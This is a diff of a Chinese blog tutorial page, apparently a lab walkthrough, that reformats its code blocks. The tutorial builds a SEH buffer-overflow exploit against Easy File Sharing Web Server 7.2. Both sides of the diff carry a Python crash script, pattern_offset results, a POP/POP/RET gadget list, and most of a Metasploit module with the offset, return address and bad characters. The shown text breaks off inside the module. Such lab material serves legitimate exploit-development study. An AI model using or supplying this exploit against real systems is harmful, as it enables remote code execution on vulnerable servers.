@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-09-26T12:15:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:24:17.698Z">
+<meta property="article:modified_time" content="2023-12-12T09:47:59.389Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta property="article:tag" content="缓冲区溢出">
@@ -144,12 +144,12 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">一、实验环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="nav-text">1、攻击机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA"><span class="nav-text">2、靶机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-text">3、漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">4、搭建实验环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">二、计算偏移量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pattern_create%E5%B7%A5%E5%85%B7"><span class="nav-text">1、使用pattern_create工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-exploit.py"><span class="nav-text">2、创建缓冲区溢出攻击脚本
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1. 实验环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="nav-text">1、攻击机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA"><span class="nav-text">2、靶机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-text">3、漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">4、搭建实验环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">2. 计算偏移量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pattern_create%E5%B7%A5%E5%85%B7"><span class="nav-text">1、使用pattern_create工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-exploit.py"><span class="nav-text">2、创建缓冲区溢出攻击脚本
 exploit.py</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit.py"><span class="nav-text">（1）exploit.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kali-%E8%BF%90%E8%A1%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%84%9A%E6%9C%AC%E6%B5%8B%E8%AF%95"><span class="nav-text">（2）kali
 运行缓冲区溢出脚本测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%9D%B6%E6%9C%BA%E4%B8%8Aeasy-file-sharing-web-server-7.2%E7%9A%84%E7%8A%B6%E6%80%81"><span class="nav-text">（3）查看靶机上Easy
 File Sharing Web Server 7.2的状态</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8easy-file-sharing-web-server-7.2%E5%B9%B6%E5%B0%86%E8%BF%9B%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%88%B0immunitydebbuger%E4%B8%AD"><span class="nav-text">3、启动Easy
 File Sharing Web Server 7.2并将进程加载到ImmunityDebbuger中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%84%9A%E6%9C%AC"><span class="nav-text">4、运行缓冲区溢出脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Beasy-file-sharing-web-server-7.2%E6%BA%A2%E5%87%BA%E5%9C%B0%E5%9D%80"><span class="nav-text">5、查看Easy File
-Sharing Web Server 7.2溢出地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pattern_offset%E5%B7%A5%E5%85%B7"><span class="nav-text">6、使用pattern_offset工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97catch%E5%9D%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">（1）计算catch块偏移量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E4%B8%8B%E4%B8%80%E6%9D%A1seh%E8%AE%B0%E5%BD%95%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">（2）计算下一条SEH记录偏移量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E6%9F%A5%E6%89%BE-poppopret-%E5%9C%B0%E5%9D%80"><span class="nav-text">三、查找 POP&#x2F;POP&#x2F;RET 地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mona%E8%84%9A%E6%9C%AC"><span class="nav-text">1、Mona脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8mona"><span class="nav-text">2、启动Mona</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msfbinscan%E8%AE%A1%E7%AE%97poppopret%E5%9C%B0%E5%9D%80"><span class="nav-text">3、使用msfbinscan计算POP&#x2F;POP&#x2F;RET地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E7%BC%96%E5%86%99-metasploit-%E7%9A%84-seh-%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="nav-text">四、编写 Metasploit 的 SEH
+Sharing Web Server 7.2溢出地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pattern_offset%E5%B7%A5%E5%85%B7"><span class="nav-text">6、使用pattern_offset工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97catch%E5%9D%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">（1）计算catch块偏移量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E4%B8%8B%E4%B8%80%E6%9D%A1seh%E8%AE%B0%E5%BD%95%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">（2）计算下一条SEH记录偏移量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE-poppopret-%E5%9C%B0%E5%9D%80"><span class="nav-text">3. 查找 POP&#x2F;POP&#x2F;RET 地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mona%E8%84%9A%E6%9C%AC"><span class="nav-text">1、Mona脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8mona"><span class="nav-text">2、启动Mona</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msfbinscan%E8%AE%A1%E7%AE%97poppopret%E5%9C%B0%E5%9D%80"><span class="nav-text">3、使用msfbinscan计算POP&#x2F;POP&#x2F;RET地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99-metasploit-%E7%9A%84-seh-%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="nav-text">4. 编写 Metasploit 的 SEH
 渗透模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%BB%A3%E7%A0%81%E6%9C%80%E7%BB%88%E7%89%88"><span class="nav-text">1、渗透代码（最终版）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="nav-text">2、代码简要分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#target"><span class="nav-text">（1）Target</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit"><span class="nav-text">（2）exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E6%89%80%E9%81%87%E9%97%AE%E9%A2%98"><span class="nav-text">3、代码调试所遇问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-text">4、msf 运行测试</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
@@ -250,7 +250,7 @@ Sharing Web Server 7.2溢出地址</span></a></li><li class="nav-item nav-level-
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:24:17" itemprop="dateModified" datetime="2023-12-09T23:24:17+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-12 17:47:59" itemprop="dateModified" datetime="2023-12-12T17:47:59+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -287,7 +287,7 @@ Sharing Web Server 7.2溢出地址</span></a></li><li class="nav-item nav-level-
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="一实验环境">一、实验环境</h2>
+    <div class="post-body" itemprop="articleBody"><h2 id="实验环境">1. 实验环境</h2>
 <h3 id="攻击机">1、攻击机</h3>
 <p>kali 2019-3</p>
 <p>下载地址：https://www.kali.org/get-kali/</p>
@@ -299,44 +299,15 @@ Sharing Web Server 7.2溢出地址</span></a></li><li class="nav-item nav-level-
 <p>自行百度下载Easy File Sharing Web Server 7.2 并在XP 安装</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926193617147-1593554307.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926193635831-1906707223.png" /></p>
-<h2 id="二计算偏移量">二、计算偏移量</h2>
+<h2 id="计算偏移量">2. 计算偏移量</h2>
 <h3 id="使用pattern_create工具">1、使用pattern_create工具</h3>
-<pre><code>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 10000 &gt; 10000.txt</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 10000 &gt; 10000.txt</span></span><br></pre></td></tr></table></figure>
 <h3 id="创建缓冲区溢出攻击脚本-exploit.py">2、创建缓冲区溢出攻击脚本
 exploit.py</h3>
 <p>需要将字符序列构造到请求头中，形成"HEAD " + 字符序列 + "
 HTTP/1.0"的格式</p>
 <h4 id="exploit.py">（1）exploit.py</h4>
-<pre><code># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
-# Date: 2019-01-16
-# Exploit Author: binghe
-# Version: 7.2
-# Tested on: XP SP3 EN
-# category: Remote Exploit
-# Usage: ./exploit.py ip port
- 
-import socket
-import sys
- 
-host = str(sys.argv[1])
-port = int(sys.argv[2])
- 
-a = socket.socket()
- 
-print &quot;Connecting to: &quot; + host + &quot;:&quot; + str(port)
-a.connect((host,port))
- 
-entire=4500
- 
-# Next SEH
-buff = &quot;Metasploit中的pattern_create.rb生成的字符序列&quot;
- 
-# HEAD
-a.send(&quot;HEAD &quot; + buff + &quot; HTTP/1.0\r\n\r\n&quot;)
- 
-a.close()
- 
-print &quot;Done...&quot;</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow</span></span><br><span class="line"><span class="comment"># Date: 2019-01-16</span></span><br><span class="line"><span class="comment"># Exploit Author: binghe</span></span><br><span class="line"><span class="comment"># Version: 7.2</span></span><br><span class="line"><span class="comment"># Tested on: XP SP3 EN</span></span><br><span class="line"><span class="comment"># category: Remote Exploit</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py ip port</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"> </span><br><span class="line">a = socket.socket()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port))</span><br><span class="line"> </span><br><span class="line">entire=<span class="number">4500</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Next SEH</span></span><br><span class="line">buff = <span class="string">&quot;Metasploit中的pattern_create.rb生成的字符序列&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># HEAD</span></span><br><span class="line">a.send(<span class="string">&quot;HEAD &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li><strong>将Metasploit中的pattern_create.rb生成的字符序列替换到 "buff
 = "Metasploit中的pattern_create.rb生成的字符序列""处即可</strong></li>
@@ -344,10 +315,7 @@ print &quot;Done...&quot;</code></pre>
 </ul>
 <h4 id="kali-运行缓冲区溢出脚本测试">（2）kali
 运行缓冲区溢出脚本测试</h4>
-<pre><code>root@kali:~/Desktop# python exploit.py  10.10.10.131 90
-Connecting to: 10.10.10.131:90
-Done...
-root@kali:~/Desktop# </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># python exploit.py  10.10.10.131 90</span></span><br><span class="line">Connecting to: 10.10.10.131:90</span><br><span class="line">Done...</span><br><span class="line">root@kali:~/Desktop<span class="comment"># </span></span><br></pre></td></tr></table></figure>
 <h4
 id="查看靶机上easy-file-sharing-web-server-7.2的状态">（3）查看靶机上Easy
 File Sharing Web Server 7.2的状态</h4>
@@ -360,10 +328,7 @@ File Sharing Web Server 7.2并将进程加载到ImmunityDebbuger中</h3>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194615596-1340887580.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194620709-1130835393.png" /></p>
 <h3 id="运行缓冲区溢出脚本">4、运行缓冲区溢出脚本</h3>
-<pre><code>root@kali:~/Desktop# python exploit.py  10.10.10.131 90
-Connecting to: 10.10.10.131:90
-Done...
-root@kali:~/Desktop# </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># python exploit.py  10.10.10.131 90</span></span><br><span class="line">Connecting to: 10.10.10.131:90</span><br><span class="line">Done...</span><br><span class="line">root@kali:~/Desktop<span class="comment"># </span></span><br></pre></td></tr></table></figure>
 <h3 id="查看easy-file-sharing-web-server-7.2溢出地址">5、查看Easy File
 Sharing Web Server 7.2溢出地址</h3>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194801578-672071654.png" /></p>
@@ -371,12 +336,10 @@ Sharing Web Server 7.2溢出地址</h3>
 <p>** catch块的地址为46356646， 下一条SEH记录地址为34664633**</p>
 <h3 id="使用pattern_offset工具">6、使用pattern_offset工具</h3>
 <h4 id="计算catch块偏移量">（1）计算catch块偏移量</h4>
-<pre><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46356646 -l 10000
-[*] Exact match at offset 4065</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@binghe:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46356646 -l 10000</span></span><br><span class="line">[*] Exact match at offset 4065</span><br></pre></td></tr></table></figure>
 <h4 id="计算下一条seh记录偏移量">（2）计算下一条SEH记录偏移量</h4>
-<pre><code>root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 34664633 -l 10000
-[*] Exact match at offset 4061</code></pre>
-<h2 id="三查找-poppopret-地址">三、查找 POP/POP/RET 地址</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@binghe:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 34664633 -l 10000</span></span><br><span class="line">[*] Exact match at offset 4061</span><br></pre></td></tr></table></figure>
+<h2 id="查找-poppopret-地址">3. 查找 POP/POP/RET 地址</h2>
 <h3 id="mona脚本">1、Mona脚本</h3>
 <p>下载地址：https://github.com/corelan/mona</p>
 <p>将mona.py放到与ImmunityDebugger.exe同级目录的PyCommands目录下</p>
@@ -388,88 +351,13 @@ modules"命令启动Mona分析DLL文件。</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926195246372-1984781649.png" /></p>
 <h3
 id="使用msfbinscan计算poppopret地址">3、使用msfbinscan计算POP/POP/RET地址</h3>
-<pre><code>msf5 &gt; msfbinscan -p /home/kali/Desktop/ImageLoad.dll
-[*] exec: msfbinscan -p /home/kali/Desktop/ImageLoad.dll
-
-[/home/kali/Desktop/ImageLoad.dll]
-0x1000108b pop ebp; pop ebx; ret
-0x10001274 pop ebp; pop ebx; ret
-0x10001877 pop esi; pop ebx; ret
-0x100018e0 pop esi; pop ebx; ret
-0x10001d9f pop ebp; pop ebx; ret
-0x100026e1 pop edi; pop ebx; ret
-0x1000283e pop edi; pop esi; ret
-0x100028ab pop edi; pop esi; ret
-0x100029b5 pop esi; pop ebx; ret
-0x10002b9b pop ebp; pop ebx; ret
-…………
-0x1002379d pop ebp; pop ebx; ret
-0x100237cc pop ebp; pop ebx; ret
-0x100237dc pop ebp; pop ebx; ret
-0x10023945 pop edi; pop esi; ret
-0x1002483f pop esi; pop ebx; ret
-0x100248be pop esi; pop ebx; ret
-0x100248ce pop esi; pop ebx; ret
-0x100248df pop esi; pop ebx; ret</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfbinscan -p /home/kali/Desktop/ImageLoad.dll</span><br><span class="line">[*] <span class="built_in">exec</span>: msfbinscan -p /home/kali/Desktop/ImageLoad.dll</span><br><span class="line"></span><br><span class="line">[/home/kali/Desktop/ImageLoad.dll]</span><br><span class="line">0x1000108b pop ebp; pop ebx; ret</span><br><span class="line">0x10001274 pop ebp; pop ebx; ret</span><br><span class="line">0x10001877 pop esi; pop ebx; ret</span><br><span class="line">0x100018e0 pop esi; pop ebx; ret</span><br><span class="line">0x10001d9f pop ebp; pop ebx; ret</span><br><span class="line">0x100026e1 pop edi; pop ebx; ret</span><br><span class="line">0x1000283e pop edi; pop esi; ret</span><br><span class="line">0x100028ab pop edi; pop esi; ret</span><br><span class="line">0x100029b5 pop esi; pop ebx; ret</span><br><span class="line">0x10002b9b pop ebp; pop ebx; ret</span><br><span class="line">…………</span><br><span class="line">0x1002379d pop ebp; pop ebx; ret</span><br><span class="line">0x100237cc pop ebp; pop ebx; ret</span><br><span class="line">0x100237dc pop ebp; pop ebx; ret</span><br><span class="line">0x10023945 pop edi; pop esi; ret</span><br><span class="line">0x1002483f pop esi; pop ebx; ret</span><br><span class="line">0x100248be pop esi; pop ebx; ret</span><br><span class="line">0x100248ce pop esi; pop ebx; ret</span><br><span class="line">0x100248df pop esi; pop ebx; ret</span><br></pre></td></tr></table></figure>
 <p>地址选择：排除掉所有可能会引起HTTP协议问题的地址（例如说连续不断的0）</p>
 <p>此处以 <strong>0x1002379d</strong> 作为 POP/POP/RET的地址为例</p>
-<h2 id="四编写-metasploit-的-seh-渗透模块">四、编写 Metasploit 的 SEH
+<h2 id="编写-metasploit-的-seh-渗透模块">4. 编写 Metasploit 的 SEH
 渗透模块</h2>
 <h3 id="渗透代码最终版">1、渗透代码（最终版）</h3>
-<pre><code>class MetasploitModule &lt; Msf::Exploit::Remote
-
-  Rank = NormalRanking
-
-  include Msf::Exploit::Remote::Tcp
-  include Msf::Exploit::Seh
-  def initialize(info = &#123;&#125;)
-    super(update_info(info,
-      &#39;Name&#39; =&gt; &#39;SEH Overflow Easy File Sharing HTTP Server 7.2&#39;,
-      &#39;Description&#39; =&gt; %q(
-      This module demonstrate SEH based overflow example
-    ),
-      &#39;Author&#39; =&gt; &#39;z9m8r8&#39;,
-      &#39;License&#39; =&gt; MSF_LICENSE,
-      &#39;Privileged&#39; =&gt; true,
-      &#39;DefaultOptions&#39; =&gt; &#123;
-        &#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,
-        &#39;RPORT&#39; =&gt; 80,
-      &#125;,
-      &#39;Payload&#39; =&gt;
-      &#123;
-        &#39;Space&#39; =&gt; 390,
-        &#39;BadChars&#39; =&gt; &quot;\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e&quot;
-      &#125;,
-      &#39;Platform&#39; =&gt; &#39;win&#39;,
-      &#39;Targets&#39; =&gt; 
-        [
-          [
-            &#39;Easy File Sharing 7.2 HTTP&#39;,
-            &#123;
-              &#39;Ret&#39; =&gt; 0x1002379d,
-              &#39;Offset&#39; =&gt; 4061
-            &#125;
-          ],
-        ],
-      &#39;DisclosureDate&#39; =&gt; &#39;2021-09-26&#39;,
-      &#39;DefaultTarget&#39; =&gt; 0
-    )
-    )
-  end
-
-  def exploit
-    connect
-    weapon=&quot;HEAD &quot;
-    weapon&lt;&lt;make_nops(target[&#39;Offset&#39;])
-    weapon&lt;&lt;generate_seh_record(target.ret)
-    weapon&lt;&lt;make_nops(19)
-    weapon&lt;&lt;payload.encoded
-    weapon&lt;&lt;&quot; HTTP/1.0\r\n\r\n&quot;
-    sock.put(weapon)
-    handler
-    disconnect
-  end
-end</code></pre>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">NormalRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Seh</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;SEH Overflow Easy File Sharing HTTP Server 7.2&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q(</span></span><br><span class="line"><span class="string">      This module demonstrate SEH based overflow example</span></span><br><span class="line"><span class="string">    )</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&#x27;EXITFUNC&#x27;</span> =&gt; <span class="string">&#x27;thread&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;RPORT&#x27;</span> =&gt; <span class="number">80</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span> =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">390</span>,</span><br><span class="line">        <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt; </span><br><span class="line">        [</span><br><span class="line">          [</span><br><span class="line">            <span class="string">&#x27;Easy File Sharing 7.2 HTTP&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x1002379d</span>,</span><br><span class="line">              <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">4061</span></span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2021-09-26&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">  <span 